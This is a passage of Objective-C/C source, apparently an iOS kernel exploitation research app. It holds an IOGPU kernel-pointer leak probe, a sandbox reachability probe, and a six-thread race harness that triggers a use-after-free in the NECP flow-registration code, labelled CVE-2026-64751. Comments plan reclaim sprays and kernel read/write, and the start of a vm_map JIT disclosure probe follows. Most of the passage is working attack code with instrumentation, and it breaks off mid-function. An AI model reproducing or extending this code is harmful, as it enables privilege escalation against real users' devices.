    DevCreate_t pDevCreate = iogpu ? dlsym(iogpu, "IOGPUDeviceCreate") : NULL;
    GetConn_t pGetConn = iogpu ? dlsym(iogpu, "IOGPUDeviceGetConnect") : NULL;
    DevRelease_t pDevRelease = iogpu ? dlsym(iogpu, "IOGPUDeviceRelease") : NULL;
    if (!pMatching || !pGet || !pCall || !pMain || !pDevCreate || !pGetConn) {
        IOPLLOG("  STOP missing IOGPU symbols\n");
        n_fail++;
    } else {
        io_service_t svc = pGet(*pMain, pMatching("IOGPU"));
        IOPLLOG("  IOGPU svc=0x%x\n", svc);
        void *gpudev = svc ? pDevCreate(svc) : NULL;
        io_connect_t conn = gpudev ? pGetConn(gpudev) : 0;
        IOPLLOG("  dev=%p conn=0x%x\n", gpudev, conn);
        if (!conn) {
            n_fail++;
        } else {
            mach_vm_address_t buf = 0;
            mach_vm_size_t blen = 0x10000;
            kern_return_t akr = mach_vm_allocate(mach_task_self(), &buf, blen, VM_FLAGS_ANYWHERE);
            IOPLLOG("  vm_allocate 64k kr=0x%x buf=%p\n", akr, (void *)(uintptr_t)buf);
            if (akr == 0 && buf) {
                memset((void *)(uintptr_t)buf, 0x41, (size_t)blen);
                int k;
                k = iopl_sel8_80(pCall, conn, buf, buf + 0x4000, 0x4000, "match-16k", out, logfd);
                if (k >= 0) { n_ok++; total_kptr += k; } else n_fail++;
                total_kptr += iopl_scan_maybe((void *)(uintptr_t)buf, 0x4000, "match-pages",
                                              0x4141414141414141ULL, out, logfd);

                IOPLLOG("  mismatch range>size (64k range, 16k size)\n");
                k = iopl_sel8_80(pCall, conn, buf, buf + 0x10000, 0x4000, "range64-size16",
                                 out, logfd);
                if (k >= 0) { n_ok++; total_kptr += k; } else n_fail++;
                total_kptr += iopl_scan_maybe((void *)(uintptr_t)buf, 0x10000, "range64-pages",
                                              0x4141414141414141ULL, out, logfd);

                IOPLLOG("  mismatch size>range (16k range, 64k size)\n");
                k = iopl_sel8_80(pCall, conn, buf, buf + 0x4000, 0x10000, "range16-size64",
                                 out, logfd);
                if (k >= 0) { n_ok++; total_kptr += k; } else n_fail++;
                total_kptr += iopl_scan_maybe((void *)(uintptr_t)buf, 0x10000, "size64-pages",
                                              0x4141414141414141ULL, out, logfd);

                mach_vm_deallocate(mach_task_self(), buf, blen);
            } else n_fail++;
        }
        if (gpudev && pDevRelease) pDevRelease(gpudev);
        if (svc && pRelease) pRelease(svc);
    }

    [out appendFormat:@"\n=== SURVIVED v7 ok=%d fail=%d kptrs=%d ===\n", n_ok, n_fail, total_kptr];
    if (total_kptr)
        [out appendString:@"KERNEL PTRS => 65349 leak HIT.\n"];
    else
        [out appendString:@"No kptrs. GPU mappings were our pages (or create rejected).\n"];
    IOPLLOG("SURVIVED iopl-v7 kptr=%d ok=%d fail=%d\n", total_kptr, n_ok, n_fail);
    if (logfd >= 0) close(logfd);
    [out appendString:@"\nDONE -- paste this text back\n"];
    return out;
}
#undef IOPLLOG
// ==== END IOPLLeakProbe.inc.h ====

// ==== BEGIN inlined NECPProbe.inc.h ====
// NECPProbe — CVE-2026-64751 reachability probe (26.5 target, device-independent).
//
// DISTINCT FROM P024:
//   P024 = SO_NECP_ATTRIBUTES (setsockopt SOL_SOCKET/0x1109) → inpcb+0x178
//          C-strings on data.kalloc / KHEAP_DATA (generic).
//   This probe = necp_client_action ADD_FLOW / REMOVE_FLOW / GET_FLOW_STATISTICS
//          object = typed site.struct necp_client_flow_registration (size 0xc8 on
//          A14 23F77). NOT SO_NECP_*, NOT inpcb string slots, NOT data.kalloc.
//
// Bug (source-confirmed, bsd/net/necp_client.c): necp_client_fd_find_flow returns a
// raw, UNRETAINED necp_client_flow_registration*; remove_flow kfree_type()s it while
// get_flow_statistics (and other accessors) can still hold + use the stale pointer.
// 26.6 fixed it by converting flow_registration to os_refcnt.
//
// This probe answers the ONE gating question before we build the race harness:
//   can a SANDBOXED APP reach the NECP flow API without entitlements?
//     necp_open(0)                 (SYS 501) — no entitlement unless OBSERVER flag
//     action ADD (1)               (SYS 502) — mint a client (benign FLAGS tlv)
//     action ADD_FLOW (17)                  — mint a flow_registration (the UAF object)
//     action GET_FLOW_STATISTICS (27)       — the UAF "use" side (race partner)
//     action REMOVE_FLOW (18)               — the UAF "free" side
//
// Interpretation:
//   EPERM/EACCES/ENOTSUP at open or ADD  => sandbox-gated => NECP dead from app => pivot.
//   success, or EINVAL/EFAULT (bad args)  => REACHED the handler => reachable => build race.
// Durable F_FULLFSYNC logging so a panic mid-probe still leaves the last step on disk.

+ (NSString *)runNECPProbe {
    NSMutableString *out = [NSMutableString string];
    [out appendFormat:@"time %@\n", [NSDate date]];
    [out appendString:@"=== NECP CVE-2026-64751 reachability (typed flow_reg) ===\n"];
    [out appendString:@"NOTE: NOT P024 SO_NECP_ATTRIBUTES / inpcb+0x178 / data.kalloc\n"];
    [out appendString:@"Zone: site.struct necp_client_flow_registration size=0xc8 (23F77)\n\n"];

    NSString *docs = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
    NSString *lp = [docs stringByAppendingPathComponent:@"necp_probe_log.txt"];
    int logfd = open([lp UTF8String], O_CREAT | O_TRUNC | O_WRONLY, 0644);
    #define NLOG(...) do { if (logfd >= 0) { char _lb[256]; int _n = snprintf(_lb, sizeof(_lb), __VA_ARGS__); write(logfd, _lb, _n); fcntl(logfd, F_FULLFSYNC); } } while (0)
    [out appendFormat:@"logfile: %s (fd=%d)\n\n", [lp UTF8String], logfd];
    NLOG("START necp-probe\n");

    // --- Step 1: necp_open(0) ---
    errno = 0;
    long fd = syscall(501, 0); // SYS_necp_open, flags=0 (no OBSERVER => no entitlement)
    int e = errno;
    [out appendFormat:@"[1] necp_open(0) -> fd=%ld errno=%d (%s)\n", fd, e, strerror(e)];
    NLOG("open fd=%ld errno=%d\n", fd, e);
    if (fd < 0) {
        [out appendFormat:@"\n*** necp_open BLOCKED (errno=%d) => NECP not reachable from this sandbox. PIVOT. ***\n", e];
        NLOG("GATE open errno=%d\n", e);
        if (logfd >= 0) close(logfd);
        [out appendString:@"\nDONE -- paste this text back\n"];
        return out;
    }

    // --- Step 2: ADD (mint a client) with a benign FLAGS tlv ---
    // necp_tlv_header = {u8 type; u32 length} packed (5 bytes). FLAGS=250, len=4, val=PROHIBIT_EXPENSIVE(0x4)
    uint8_t client_id[16] = {0};
    uint8_t params[9] = { 250, 4,0,0,0,  0x04,0,0,0 };
    errno = 0;
    long r = syscall(502, (int)fd, 1, client_id, 16, params, (long)sizeof(params)); // NECP_CLIENT_ACTION_ADD
    e = errno;
    [out appendFormat:@"[2] ADD -> ret=%ld errno=%d (%s)  client_id=%02x%02x%02x%02x...\n",
        r, e, strerror(e), client_id[0], client_id[1], client_id[2], client_id[3]];
    NLOG("add ret=%ld errno=%d cid=%02x%02x\n", r, e, client_id[0], client_id[1]);
    if (r != 0) {
        if (e == EPERM || e == EACCES || r == EPERM || r == EACCES) {
            [out appendFormat:@"\n*** ADD gated (errno=%d ret=%ld) => client creation blocked. PIVOT. ***\n", e, r];
            NLOG("GATE add errno=%d ret=%ld\n", e, r);
        } else {
            [out appendFormat:@"\nADD reached handler but rejected args (errno=%d ret=%ld). NECP REACHABLE; fix tlv host-side.\n", e, r];
            NLOG("REACH add-args errno=%d ret=%ld\n", e, r);
        }
        if (logfd >= 0) close(logfd);
        [out appendString:@"\nDONE -- paste this text back\n"];
        return out;
    }
    [out appendString:@"    <<< client minted (no entitlement) — NECP client API reachable\n"];

    // --- Step 3: ADD_FLOW (mint a flow_registration = the UAF object) ---
    uint8_t addflow[36]; memset(addflow, 0, sizeof(addflow)); // necp_client_add_flow: flags=0, stats_request_count=0
    errno = 0;
    r = syscall(502, (int)fd, 17, client_id, 16, addflow, (long)sizeof(addflow)); // ADD_FLOW
    e = errno;
    uint8_t *flow_id = addflow + 16; // registration_id (output)
    [out appendFormat:@"[3] ADD_FLOW -> ret=%ld errno=%d (%s)  flow_id=%02x%02x%02x%02x...\n",
        r, e, strerror(e), flow_id[0], flow_id[1], flow_id[2], flow_id[3]];
    NLOG("addflow ret=%ld errno=%d fid=%02x%02x\n", r, e, flow_id[0], flow_id[1]);
    if (r != 0) {
        [out appendFormat:@"    ADD_FLOW rejected (errno=%d ret=%ld). Client OK but flow not minted.\n", e, r];
        NLOG("addflow-fail errno=%d ret=%ld\n", e, r);
    } else {
        [out appendString:@"    <<< flow_registration minted — UAF object creatable\n"];
    }

    // --- Step 4: GET_FLOW_STATISTICS (the UAF "use" side) ---
    if (r == 0) {
        uint8_t stats[64]; memset(stats, 0, sizeof(stats));
        *(uint32_t*)(stats + 0) = 6; // transport_proto = IPPROTO_TCP (field the handler checks)
        errno = 0;
        long r4 = syscall(502, (int)fd, 27, flow_id, 16, stats, (long)sizeof(stats)); // GET_FLOW_STATISTICS
        int e4 = errno;
        [out appendFormat:@"[4] GET_FLOW_STATISTICS -> ret=%ld errno=%d (%s)\n", r4, e4, strerror(e4)];
        NLOG("getstats ret=%ld errno=%d\n", r4, e4);
        if (e4 == EPERM || e4 == EACCES) {
            [out appendString:@"    get-stats GATED (may be aop-only) — will pick another find_flow accessor as race partner.\n"];
        } else {
            [out appendString:@"    get-stats reached (race partner available).\n"];
        }

        // --- Step 5: REMOVE_FLOW (the UAF "free" side) ---
        errno = 0;
        long r5 = syscall(502, (int)fd, 18, flow_id, 16, NULL, 0); // REMOVE_FLOW
        int e5 = errno;
        [out appendFormat:@"[5] REMOVE_FLOW -> ret=%ld errno=%d (%s)\n", r5, e5, strerror(e5)];
        NLOG("removeflow ret=%ld errno=%d\n", r5, e5);
    }

    [out appendString:@"\n=== VERDICT ===\n"];
    [out appendString:@"If [1][2][3] all succeeded with no entitlement => NECP flow UAF is REACHABLE.\n"];
    [out appendString:@"Next: build the remove_flow vs get_flow_statistics race + reclaim spray harness.\n"];
    NLOG("SURVIVED necp-probe\n");
    if (logfd >= 0) close(logfd);
    [out appendString:@"\nDONE -- paste this text back\n"];
    return out;
}
// ==== END NECPProbe.inc.h ====

// ==== BEGIN inlined NECPRace.inc.h ====
// NECPRace — CVE-2026-64751 stage-2: trigger the flow_registration UAF (26.5 only).
//
// DISTINCT FROM P024:
//   P024 = SO_NECP_ATTRIBUTES setsockopt → inpcb+0x178 C-strings → data.kalloc.
//   This = REMOVE_FLOW vs GET_FLOW_STATISTICS on typed
//          necp_client_flow_registration (0xc8). Wrong to mix reclaim stats.
//
// Bug: necp_client_fd_find_flow returns a raw, UNRETAINED flow_registration*.
//   GET_STATS:  FD_LOCK → find → retain client → FD_UNLOCK → [GAP] → CLIENT_LOCK → use
//   REMOVE:     FD_LOCK → find → RB_REMOVE → retain client → FD_UNLOCK → CLIENT_LOCK → kfree
// UAF if GET_STATS is in [GAP] when REMOVE wins CLIENT_LOCK and frees.
//
// v4 survived 20k with stats_calls==97 every iter (= wait-32 + wait-+64). That is
// sequential: GET_STATS had already returned before REMOVE ran, so REMOVE was not
// waiting on FD_LOCK when GET_STATS dropped it. The GAP is a few instructions
// after lck_mtx_unlock — a preemption point only if a higher-pri waiter exists.
//
// v5: fired REMOVE on in_flight>=1. in_flight is bumped in *userspace* before
// the syscall, so REMOVE usually entered the kernel first. 50k survive,
// e22=77 vs e0=22.4M (post-remove miss flood while live stayed 1).
// v6: wait until GET_STATS has actually *found* this flow (e22 increases),
// keep racers looping (FD_LOCK hot), THEN high-pri REMOVE, then live=0.
// Result: 50k survive, hits=8 every iter, e22=543k e0=123k, max_inflight=6.
// No panic — expected: use is `if (flow->client == client) copy_flow_stats`
// then !aop → EINVAL. Intact quarantine looks exactly like live (errno 22).
// Poisoned +0x88 looks like miss (errno 0). Panic needs junk in the slot.
// v7: post22=49353/50k (~1/iter). That rate is the QoS artifact: BG GET_STATS
// takes CLIENT_LOCK, uses the *live* object, drops it; UI REMOVE then kfree+
// returns before BG increments e22. post22 is NOT UAF proof.
// v8: both threads DEFAULT (v7 biased UI-REMOVE vs BG-GET_STATS). If post22
// collapses, v7 was artifact. If post22 stays ~1/iter, silent UAF is likelier.
// Zone (A14 23F77): site.struct necp_client_flow_registration size=0xc8
// sig='1111111111122221111111112' — DEDICATED bucket (no cohabitants).
// Same wall as P010 UC: IOSurface/OOL cannot reclaim; ADD_FLOW only plants
// another kernel-initialized object (Z_ZERO). No fake-client KRW from that.

#define SYS_necp_open 501
#define SYS_necp_client_action 502
#define NECP_ADD 1
#define NECP_ADD_FLOW 17
#define NECP_REMOVE_FLOW 18
#define NECP_GET_FLOW_STATS 27
#define NECP_N_RACERS 6

typedef long (*necp_act_t)(int, uint32_t, void *, size_t, void *, size_t);

static int      g_necp_fd = -1;
static uint8_t  g_necp_client[16];
static uint8_t  g_necp_flow[16];
static volatile int g_global_stop = 0;
static volatile int g_live = 0;
static volatile int g_in_flight = 0;
static volatile long g_stats_calls = 0;
static volatile long g_e22 = 0, g_e0 = 0, g_e45 = 0, g_eother = 0;
static volatile long g_post22 = 0, g_post0 = 0;
static volatile int g_first_stats_errno = -1;
static uint32_t g_use_action = 27;
static size_t   g_use_sz = 0x1ac;
static uint8_t *g_use_id = NULL;
static uint32_t g_proto_off = 0x1a8;
static necp_act_t g_necp_act = NULL;

static long necp_act(int fd, uint32_t act, void *id, size_t idl, void *buf, size_t bufl) {
    if (g_necp_act)
        return g_necp_act(fd, act, id, idl, buf, bufl);
    return syscall(SYS_necp_client_action, fd, act, id, idl, buf, bufl);
}

static void necp_mkstats(uint8_t *b, size_t n) {
    memset(b, 0, n);
    if (g_proto_off + 1 <= n) b[g_proto_off] = 6;
}

static void *necp_racer(void *arg) {
    (void)arg;
    pthread_set_qos_class_self_np(QOS_CLASS_DEFAULT, 0);
    uint8_t stats[0x400];
    while (!g_global_stop) {
        if (!__atomic_load_n(&g_live, __ATOMIC_ACQUIRE)) {
            continue;
        }
        necp_mkstats(stats, g_use_sz);
        __atomic_add_fetch(&g_in_flight, 1, __ATOMIC_ACQUIRE);
        if (!__atomic_load_n(&g_live, __ATOMIC_ACQUIRE) || g_global_stop) {
            __atomic_sub_fetch(&g_in_flight, 1, __ATOMIC_RELEASE);
            continue;
        }
        errno = 0;
        long r = necp_act(g_necp_fd, g_use_action, g_use_id, 16, stats, g_use_sz);
        int e = (r == 0) ? 0 : (r > 0 ? (int)r : errno);
        __atomic_sub_fetch(&g_in_flight, 1, __ATOMIC_RELEASE);
        int expected = -1;
        __atomic_compare_exchange_n(&g_first_stats_errno, &expected, e, 0,
                                    __ATOMIC_RELAXED, __ATOMIC_RELAXED);
        if (e == 22) __atomic_add_fetch(&g_e22, 1, __ATOMIC_RELAXED);
        else if (e == 0) __atomic_add_fetch(&g_e0, 1, __ATOMIC_RELAXED);
        else if (e == 45) __atomic_add_fetch(&g_e45, 1, __ATOMIC_RELAXED);
        else __atomic_add_fetch(&g_eother, 1, __ATOMIC_RELAXED);
        __atomic_add_fetch(&g_stats_calls, 1, __ATOMIC_RELAXED);
    }
    return NULL;
}

#undef NLOG

+ (NSString *)runNECPRace {
    NSMutableString *out = [NSMutableString string];
    [out appendFormat:@"time %@\n", [NSDate date]];
    [out appendString:@"=== NECP CVE-2026-64751 flow UAF race v8 (26.5 ONLY) ===\n"];
    [out appendString:@"NOTE: typed flow_reg 0xc8 — NOT P024 SO_NECP_ATTRIBUTES / data.kalloc\n"];
    [out appendString:@"QoS: both DEFAULT (v7 was BG GET_STATS vs UI REMOVE — post22 artifact).\n\n"];

    NSString *docs = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
    NSString *lp = [docs stringByAppendingPathComponent:@"necp_race_log.txt"];
    int logfd = open([lp UTF8String], O_CREAT | O_TRUNC | O_WRONLY, 0644);
    #define NRLOG(...) do { if (logfd >= 0) { char _lb[220]; int _n = snprintf(_lb, sizeof(_lb), __VA_ARGS__); write(logfd, _lb, _n); fcntl(logfd, F_FULLFSYNC); } } while (0)
    [out appendFormat:@"logfile: %s (fd=%d)\n\n", [lp UTF8String], logfd];
    NRLOG("START necp-race v8 qos-invert\n");

    pthread_set_qos_class_self_np(QOS_CLASS_DEFAULT, 0);

    g_necp_act = (necp_act_t)dlsym(RTLD_DEFAULT, "necp_client_action");
    [out appendFormat:@"necp_client_action libc=%p (null => raw syscall 502)\n", g_necp_act];
    g_necp_fd = (int)syscall(SYS_necp_open, 0);
    if (g_necp_fd < 0) { [out appendFormat:@"STOP necp_open errno=%d\n", errno]; return out; }
    uint8_t params[9] = { 250, 4,0,0,0, 0x04,0,0,0 };
    if (necp_act(g_necp_fd, NECP_ADD, g_necp_client, 16, params, sizeof(params)) != 0) {
        [out appendFormat:@"STOP ADD errno=%d (NECP gated?)\n", errno]; return out;
    }
    [out appendFormat:@"necp fd=%d client=%02x%02x%02x%02x\n\n", g_necp_fd,
        g_necp_client[0], g_necp_client[1], g_necp_client[2], g_necp_client[3]];

    /* ABI gate on a throwaway flow — same as v4, must be errno 22 / 45. */
    uint8_t addflow[36]; memset(addflow, 0, sizeof(addflow));
    if (necp_act(g_necp_fd, NECP_ADD_FLOW, g_necp_client, 16, addflow, sizeof(addflow)) != 0) {
        [out appendFormat:@"STOP ADD_FLOW errno=%d\n", errno]; NRLOG("STOP addflow\n");
        if (logfd>=0) close(logfd); return out;
    }
    memcpy(g_necp_flow, addflow + 16, 16);
    g_use_id = g_necp_flow;
    g_use_action = 27; g_use_sz = 0x1ac; g_proto_off = 0x1a8;

    {
        [out appendString:@"--- ABI gate (USE = errno 22 after proto==6; 45 is NOT find_flow) ---\n"];
        uint8_t buf[0x400];
        int e6 = -1, e0 = -1;
        necp_act_t libcfn = g_necp_act;
        int picked = 0;
        for (int libc = 0; libc < 2 && !picked; libc++) {
            g_necp_act = (libc == 0) ? NULL : libcfn;
            memset(buf, 0, sizeof(buf)); buf[0x1a8] = 6; errno = 0;
            long r6 = necp_act(g_necp_fd, 27, g_necp_flow, 16, buf, 0x1ac);
            e6 = (r6 == 0) ? 0 : (r6 > 0 ? (int)r6 : errno);
            memset(buf, 0, sizeof(buf)); errno = 0;
            long r0 = necp_act(g_necp_fd, 27, g_necp_flow, 16, buf, 0x1ac);
            e0 = (r0 == 0) ? 0 : (r0 > 0 ? (int)r0 : errno);
            [out appendFormat:@"  %s proto@0x1a8=6 -> ret=%ld errno=%d  (want 22 = find_flow)\n",
                 libc ? "libc" : "sys", r6, e6];
            [out appendFormat:@"  %s proto@0x1a8=0 -> ret=%ld errno=%d  (want 45 = no find_flow)\n",
                 libc ? "libc" : "sys", r0, e0];
            if (e6 == 22) picked = 1;
        }
        if (!picked) g_necp_act = libcfn;
        if (e6 != 22) {
            [out appendFormat:@"STOP: proto@0x1a8=6 errno=%d (need 22).\n", e6];
            NRLOG("STOP proto6=%d\n", e6);
            if (logfd>=0) close(logfd); return out;
        }
        [out appendFormat:@"USE action=27 sz=0x1ac proto@0x1a8=6 id=flow  (neg proto0 errno=%d)\n\n", e0];
        NRLOG("USE e6=22 e0=%d\n", e0);
        syscall(SYS_necp_client_action, g_necp_fd, NECP_REMOVE_FLOW, g_necp_flow, 16, NULL, 0);
    }

    pthread_t racers[NECP_N_RACERS];
    g_global_stop = 0; g_live = 0; g_in_flight = 0;
    for (int i = 0; i < NECP_N_RACERS; i++) {
        if (pthread_create(&racers[i], NULL, necp_racer, NULL) != 0) {
            [out appendString:@"STOP pthread_create\n"]; NRLOG("STOP pthread\n");
            g_global_stop = 1;
            if (logfd>=0) close(logfd); return out;
        }
    }
    [out appendFormat:@"started %d DEFAULT GET_STATS racers; main DEFAULT REMOVE (no QoS bias)\n\n",
         NECP_N_RACERS];

    const int ITERS = 50000;
    int flows_ok = 0;
    long max_inflight = 0;
    for (int it = 0; it < ITERS; it++) {
        memset(addflow, 0, sizeof(addflow));
        if (necp_act(g_necp_fd, NECP_ADD_FLOW, g_necp_client, 16, addflow, sizeof(addflow)) != 0) {
            if (it == 0) {
                [out appendFormat:@"STOP ADD_FLOW errno=%d\n", errno]; NRLOG("STOP addflow2\n");
                g_global_stop = 1;
                for (int i = 0; i < NECP_N_RACERS; i++) pthread_join(racers[i], NULL);
                if (logfd>=0) close(logfd); return out;
            }
            continue;
        }
        memcpy(g_necp_flow, addflow + 16, 16);
        flows_ok++;

        g_stats_calls = 0;
        if (it == 0) g_first_stats_errno = -1;
        long e22_base = g_e22;
        /* v5 fired on in_flight (userspace) — REMOVE beat GET_STATS into the
         * kernel. Wait until this flow has actually been found (errno 22),
         * so racers are looping on FD_LOCK, THEN remove. */
        __atomic_store_n(&g_live, 1, __ATOMIC_RELEASE);

        int spins = 0;
        while (g_e22 < e22_base + 8 && spins < 4000000) spins++;
        int infl = __atomic_load_n(&g_in_flight, __ATOMIC_ACQUIRE);
        long hits = g_e22 - e22_base;
        if (infl > max_inflight) max_inflight = infl;

        syscall(SYS_necp_client_action, g_necp_fd, NECP_REMOVE_FLOW, g_necp_flow, 16, NULL, 0);
        long e22_ret = g_e22, e0_ret = g_e0;

        /* stop new GET_STATS immediately — v5 left live=1 and flooded misses */
        __atomic_store_n(&g_live, 0, __ATOMIC_RELEASE);
        spins = 0;
        while (__atomic_load_n(&g_in_flight, __ATOMIC_ACQUIRE) > 0 && spins < 2000000) spins++;
        long post22 = g_e22 - e22_ret;
        long post0 = g_e0 - e0_ret;
        if (post22 > 0) __atomic_add_fetch(&g_post22, post22, __ATOMIC_RELAXED);
        if (post0 > 0) __atomic_add_fetch(&g_post0, post0, __ATOMIC_RELAXED);

        if (it == 0) {
            [out appendFormat:@"  racer first errno=%d hits_before_remove=%ld infl=%d post22=%ld post0=%ld\n",
                 g_first_stats_errno, hits, infl, post22, post0];
            NRLOG("first_errno=%d hits=%ld infl=%d post22=%ld post0=%ld\n",
                 g_first_stats_errno, hits, infl, post22, post0);
            if (g_first_stats_errno == 45) {
                [out appendString:@"STOP: racer still ENOTSUP.\n"];
                g_global_stop = 1;
                for (int i = 0; i < NECP_N_RACERS; i++) pthread_join(racers[i], NULL);
                if (logfd>=0) close(logfd); return out;
            }
            if (hits < 1) {
                [out appendString:@"STOP: no find_hit before REMOVE — GET_STATS never saw this flow.\n"];
                g_global_stop = 1;
                for (int i = 0; i < NECP_N_RACERS; i++) pthread_join(racers[i], NULL);
                if (logfd>=0) close(logfd); return out;
            }
        }
        if ((it % 1000) == 0) {
            [out appendFormat:@"  it=%d hits=%ld infl=%d post22=%ld post0=%ld e22=%ld e0=%ld\n",
                 it, hits, infl, post22, post0, g_e22, g_e0];
            NRLOG("it=%d hits=%ld infl=%d post22=%ld post0=%ld\n",
                 it, hits, infl, post22, post0);
        }
    }

    g_global_stop = 1;
    __atomic_store_n(&g_live, 1, __ATOMIC_RELEASE); /* unstick any spinner */
    for (int i = 0; i < NECP_N_RACERS; i++) pthread_join(racers[i], NULL);

    [out appendFormat:@"\n=== SURVIVED %d iters (%d flows) max_inflight=%ld ===\n", ITERS, flows_ok, max_inflight];
    [out appendFormat:@"errno histogram: 22=%ld  0=%ld  45=%ld  other=%ld\n",
         g_e22, g_e0, g_e45, g_eother];
    [out appendFormat:@"POST-REMOVE: errno22=%ld  errno0=%ld\n", g_post22, g_post0];
    [out appendString:@"Compare to v7 post22~49353/50k with UI-REMOVE bias.\n"];
    [out appendString:@"post22 collapses: v7 was QoS artifact. post22 stays ~1/iter: silent UAF more likely.\n"];
    [out appendString:@"Zone is dedicated 0xc8 — no reclaim either way.\n"];
    NRLOG("SURVIVED v8 iters=%d post22=%ld post0=%ld e22=%ld e0=%ld\n",
         ITERS, g_post22, g_post0, g_e22, g_e0);
    if (logfd >= 0) close(logfd);
    [out appendString:@"\nDONE -- paste this text back\n"];
    return out;
}
// ==== END NECPRace.inc.h ====

// ==== BEGIN inlined P005Probe.inc.h ====
// P005Probe v2 — CVE-2026-64709 candidate (JIT-downgrade / vm_map disclose watch)
//
// A14 23F77 cites (string xrefs — NOT iPad VAs):
//   "vm_map_copyout: wiring %p @%s:%d"  @ 0xfffffff00704ed7b
//   xref site 0xfffffff009ed4a34 → fn vm_map_copyout_internal 0xfffffff009ed4310
//   "downgrade JIT for entry" string: ABSENT (26.6-only)
//   MOVZ#0xfdff+MOVK#0xffbf (0xffbffdff) pairs: 0 on 23F77
//   NOTE: A14 copyout already does entry+0x38 &= 0xffbfddff when bit0x16 set
//         in one branch — 26.6 adds log + 0xffbffdff in more paths. Diff ≠
//         "no mask at all on A14". Probe stays black-box.
//
// Prior 26.5 run (2026-08-20): 0 kptr, MAP_JIT kr=4, make_memory_entry RWX kr=2.
// THIS v2: A14 banner; memory-entry R/RW/RWX; mmap MAP_JIT try; clearer verdict.
// Still NOT a 64709 test without allow-jit (or another way to set entry bit 0x16).
// Durable F_FULLFSYNC logging. Pure userspace mach_vm — no crash expected.

// NOTE: was mid-impl #import string/dlfcn — already at file top.

#ifndef MAP_JIT
#define MAP_JIT 0x0800
#endif

static int p005_scan_kptrs(uint8_t *buf, size_t len, const char *tag, NSMutableString *out,
                           int *nonmarker_out) {
    (void)tag;
    int hits = 0;
    long nonmarker = 0;
    for (size_t i = 0; i + 8 <= len; i += 8) {
        uint64_t v; memcpy(&v, buf + i, 8);
        if (v != 0x4141414141414141ULL) nonmarker++;
        if ((v >= 0xffffffe000000000ULL && v <= 0xffffffffffffffffULL) ||
            (v >= 0xfffffff000000000ULL && v <= 0xfffffeffffffffffULL)) {
            if (hits < 24) {
                [out appendFormat:@"    [%s] +0x%zx: 0x%016llx\n", tag, i, (unsigned long long)v];
            }
            hits++;
        }
    }
    if (nonmarker_out) *nonmarker_out = (int)nonmarker;
    return hits;
}

static void p005_try_mementry(NSMutableString *out, int logfd, mach_port_t selftask,
                              vm_address_t src, vm_size_t SZ, const char *vname, int vi,
                              vm_prot_t entry_prot, int *total_kptr_hits) {
    mach_vm_size_t esz = SZ;
    mem_entry_name_port_t entry = MACH_PORT_NULL;
    kern_return_t kr = mach_make_memory_entry_64(selftask, &esz, src, entry_prot, &entry,
                                                 MACH_PORT_NULL);
    const char *prot_s = (entry_prot == (VM_PROT_READ|VM_PROT_WRITE|VM_PROT_EXECUTE)) ? "rwx" :
                         (entry_prot == (VM_PROT_READ|VM_PROT_WRITE)) ? "rw" :
                         (entry_prot == VM_PROT_READ) ? "r" : "?";
    if (kr != KERN_SUCCESS || entry == MACH_PORT_NULL) {
        [out appendFormat:@"  [%s] make_memory_entry(%s) kr=0x%x\n", vname, prot_s, kr];
        if (logfd >= 0) {
            char lb[128]; int n = snprintf(lb, sizeof(lb), "v%d mementry_%s kr=0x%x\n", vi, prot_s, kr);
            write(logfd, lb, n); fcntl(logfd, F_FULLFSYNC);
        }
        return;
    }
    mach_vm_address_t mapdst = 0;
    extern kern_return_t mach_vm_map(vm_map_t, mach_vm_address_t *, mach_vm_size_t,
        mach_vm_offset_t, int, mem_entry_name_port_t, memory_object_offset_t,
        boolean_t, vm_prot_t, vm_prot_t, vm_inherit_t);
    kr = mach_vm_map(selftask, &mapdst, SZ, 0, VM_FLAGS_ANYWHERE,
                     entry, 0, TRUE, VM_PROT_READ, VM_PROT_READ|VM_PROT_WRITE|VM_PROT_EXECUTE,
                     VM_INHERIT_DEFAULT);
    if (kr == KERN_SUCCESS && mapdst) {
        int nm = 0;
        char tag[32]; snprintf(tag, sizeof(tag), "me.%s", prot_s);
        int h = p005_scan_kptrs((uint8_t*)mapdst, SZ, tag, out, &nm);
        if (h) {
            [out appendFormat:@"  *** [%s] mementry(%s).map KERNEL-PTR hits=%d ***\n", vname, prot_s, h];
            *total_kptr_hits += h;
        }
        [out appendFormat:@"  [%s] mementry(%s).map dst=0x%llx kptr=%d foreign_qw=%d\n",
            vname, prot_s, (unsigned long long)mapdst, h, nm];
        mach_vm_deallocate(selftask, mapdst, SZ);
    } else {
        [out appendFormat:@"  [%s] mementry(%s).map kr=0x%x\n", vname, prot_s, kr];
    }
    mach_port_deallocate(selftask, entry);
}

#undef NRLOG

+ (NSString *)runP005Probe {
    NSMutableString *out = [NSMutableString string];
    [out appendFormat:@"time %@\n", [NSDate date]];
    [out appendString:@"=== P005 v3 CVE-2026-64709 watch (A14 23F77) ===\n"];
    [out appendString:@"Candidate: vm_map_remap of a JIT entry (bit22 @ entry+0x38).\n"];
    [out appendString:@"copyout_internal 0xfffffff009ed4310 already masks +0x38 with 0xffbfddff if bit22.\n"];
    [out appendString:@"26.6 adds the SAME idea on remap + log. 23F77 remap has NO bit22 downgrade.\n"];
    [out appendString:@"NOT KRW. Remapping 0x41 pages cannot leak kernel unless MAP_JIT entry exists.\n"];
    [out appendString:@"vm_allocate|0x800 is NOT mmap MAP_JIT (different flag namespace) — kr=4 expected.\n\n"];

    NSString *docs = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
    NSString *lp = [docs stringByAppendingPathComponent:@"p005_probe_log.txt"];
    int logfd = open([lp UTF8String], O_CREAT | O_TRUNC | O_WRONLY, 0644);
    #define P005LOG(...) do { if (logfd >= 0) { char _lb[256]; int _n = snprintf(_lb, sizeof(_lb), __VA_ARGS__); write(logfd, _lb, _n); fcntl(logfd, F_FULLFSYNC); } } while (0)
    [out appendFormat:@"logfile: %s (fd=%d)\n\n", [lp UTF8String], logfd];
    P005LOG("START p005-probe-v3 A14\n");

    {
        [out appendString:@"--- signed entitlements (what AMFI actually sees) ---\n"];
        void *sec = dlopen("/System/Library/Frameworks/Security.framework/Security", RTLD_LAZY);
        void *(*pCreate)(CFAllocatorRef) = sec ? dlsym(sec, "SecTaskCreateFromSelf") : NULL;
        CFTypeRef (*pCopyEnt)(void *, CFStringRef, CFErrorRef *) =
            sec ? dlsym(sec, "SecTaskCopyValueForEntitlement") : NULL;
